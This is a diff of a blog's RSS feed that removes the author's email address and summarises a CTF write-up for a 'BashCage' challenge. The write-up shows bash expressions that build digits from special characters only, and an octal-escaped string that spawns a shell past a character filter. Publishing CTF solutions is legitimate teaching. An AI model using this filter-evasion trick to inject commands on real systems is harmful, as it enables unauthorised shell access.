@@ -3,8 +3,8 @@
         <title>Writeups - Category - TheSaucese&#39;s Blog</title>
         <link>https://thesaucese.github.io/categories/writeups/</link>
         <description>Writeups - Category - TheSaucese&#39;s Blog</description>
-        <generator>Hugo -- gohugo.io</generator><language>en</language><managingEditor>soufianessahli@proton.me (TheSaucese)</managingEditor>
-            <webMaster>soufianessahli@proton.me (TheSaucese)</webMaster><lastBuildDate>Mon, 23 Dec 2024 05:52:27 &#43;0600</lastBuildDate><atom:link href="https://thesaucese.github.io/categories/writeups/" rel="self" type="application/rss+xml" /><item>
+        <generator>Hugo -- gohugo.io</generator><language>en</language><managingEditor>no (TheSaucese)</managingEditor>
+            <webMaster>no (TheSaucese)</webMaster><lastBuildDate>Mon, 23 Dec 2024 05:52:27 &#43;0600</lastBuildDate><atom:link href="https://thesaucese.github.io/categories/writeups/" rel="self" type="application/rss+xml" /><item>
     <title>Cyber Odyssey 2024 Finals - Full Writeup</title>
     <link>https://thesaucese.github.io/cyberodysseyfinals/</link>
     <pubDate>Mon, 23 Dec 2024 05:52:27 &#43;0600</pubDate>
@@ -13,7 +13,7 @@
     <description><![CDATA[Intro Dolphin supremacy 🐬🐬🐬🐬🐬🐬🐬🐬🐬🐬🐬🐬🐬🐬🐬🐬🐬🐬🐬🐬🐬
 BashCage - Misc Description I heard you can execute bash commands using only special characters. Show me what you got!
 Explanation Inspired by https://medium.com/@philomath213/securinets-ctf-quals-2019-special-revenge-6c923d5b900b and https://gist.github.com/dimasma0305/c3d5d3cac71c8240a491a3010f2372b8
-I pretty much had to write &ldquo;sh&rdquo; (which would open a shell) knowing that :
+I pretty much had to write &ldquo;sh&rdquo; (which would open a shell) knowing that : {% raw %}
 &#34;0&#34;: &#34;${#}&#34;, &#34;1&#34;: &#34;${##}&#34;, &#34;2&#34;: &#34;$((${##}&lt;&lt;$((${##}))))&#34;, &#34;3&#34;: &#34;$((${##}&lt;&lt;$((${##}))^${##}))&#34;, &#34;4&#34;: &#34;$((${##}&lt;&lt;$((${##}))&lt;&lt;$((${##}))))&#34;, &#34;5&#34;: &#34;$((${##}&lt;&lt;$((${##}))&lt;&lt;$((${##}))^${##}))&#34;, &#34;6&#34;: &#34;$(($((${##}&lt;&lt;$((${##}))^${##}))&lt;&lt;${##}))&#34;, &#34;7&#34;: &#34;$(($((${##}&lt;&lt;$((${##}))^${##}))&lt;&lt;${##}^${##}))&#34;, &#34;8&#34;: &#34;$((${##}&lt;&lt;$((${##}))&lt;&lt;$((${##}))&lt;&lt;$((${##}))))&#34;, &#34;9&#34;: &#34;$((${##}&lt;&lt;$((${##}))&lt;&lt;$((${##}))&lt;&lt;$((${##}))^${##}))&#34;, We can call a shell by doing : $'\163'$'\150']]></description>
 </item>
 <item>
